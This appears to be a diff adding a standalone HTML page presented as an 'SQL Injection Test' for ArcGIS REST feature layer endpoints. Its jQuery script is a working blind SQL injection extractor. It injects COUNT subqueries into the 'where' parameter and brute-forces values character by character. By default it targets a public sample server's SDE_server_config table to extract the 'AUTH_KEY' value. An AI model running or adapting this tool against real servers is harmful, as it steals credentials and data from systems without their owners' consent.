@@ -1,0 +1,98 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>ArcGIS REST API - SQL Injection Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h3>SQL Injection Test</h3>
+        <div class="form-group">
+            <label>Url:</label>
+            <input type="url" class="form-control" id="txtUrl" placeholder="Feature Layer Url (i.e. /MapServer/0)" value="http://sampleserver4.arcgisonline.com/ArcGIS/rest/services/HomelandSecurity/Incident_Data_Extraction/MapServer/0" />
+        </div>
+        <div class="form-group">
+            <label>Table:</label>
+            <input type="text" class="form-control" id="txtTable" placeholder="Table Name (i.e. GDB_ITEMS)" value="SDE_server_config" />
+        </div>
+        <div class="form-group">
+            <label>Field:</label>
+            <input type="text" class="form-control" id="txtField" placeholder="Field Name (i.e. PhysicalName)" value="char_prop_value" />
+        </div>
+        <div class="form-group">
+            <label>Where Clause (Optional):</label>
+            <input type="text" class="form-control" id="txtWhereClause" placeholder="Where Clause (Optional)" value="prop_name='AUTH_KEY'" />
+        </div>
+        <button type="button" class="btn btn-default pull-right" id="btnStart">Start</button>
+    </div>
+    <div class="container" style="word-wrap: break-word;">
+        <div id="txtTemp" class="alert alert-warning"></div>
+        <div id="txtResult" class="alert alert-success"></div>
+    </div>
+    <script>
+        var url, table, field, whereClause;
+        var chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '\"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '{', '|', '}', '~'];
+        var stopped;
+
+        $(document).ready(function () {
+            $("#txtTemp").hide();
+            $("#txtResult").hide();
+            $("#btnStart").click(function () {
+                url = $("#txtUrl").val();
+                table = $("#txtTable").val();
+                field = $("#txtField").val();
+                whereClause = $("#txtWhereClause").val() || "0=0";
+                $("#txtResult").text("").hide();
+                stopped = false;
+                check1("");
+            });
+        });
+
+        function check1(seed) {
+            if (stopped) return;
+            $("input, button").prop("disabled", true);
+            $.each(chars, function (_, c) {
+                var value = seed + c;
+                $.ajax({
+                    url: url + "/query?where=" + encodeURIComponent("(SELECT COUNT(" + field + ") FROM " + table + " WHERE UPPER(" + field + ") LIKE '" + value.replace(/\%/g, "[%]").replace(/\\/g, "[\]").replace(/_/g, "[_]").replace(/'/g, "''") + "%' AND (" + whereClause + "))>0") + "&returnCountOnly=true&f=json",
+                    dataType: "jsonp",
+                    success: function (data) {
+                        if (data.error && data.error.message) {
+                            $("#txtTemp").text(data.error.message).show();
+                            $("input, button").prop("disabled", false);
+                            stopped = true;
+                        } else if (data.count > 0) {
+                            $("#txtTemp").text(value).show();
+                            check1(value);
+                            check2(value);
+                        }
+                    }
+                });
+
+            });
+        }
+
+        function check2(text) {
+            if (stopped) return;
+            $("input, button").prop("disabled", true);
+            $.ajax({
+                url: url + "/query?where=" + encodeURIComponent("(SELECT COUNT(" + field + ") FROM " + table + " WHERE UPPER(" + field + ") = '" + text.replace(/'/g, "''").replace(/\\/g, "\\") + "' AND (" + whereClause + "))>0") + "&returnCountOnly=true&f=json",
+                dataType: "jsonp",
+                success: function (data) {
+                    if (data.count > 0) {
+                        $("#txtResult").append("<h4>" + text + "</h4>").show();
+                        if ($("#txtTemp").text() === text) {
+                            $("#txtTemp").text("").hide();
+                            $("input, button").prop("disabled", false);
+                        }
+                    }
+                }
+            });
+        }
+    </script>
+</body>
+</html>
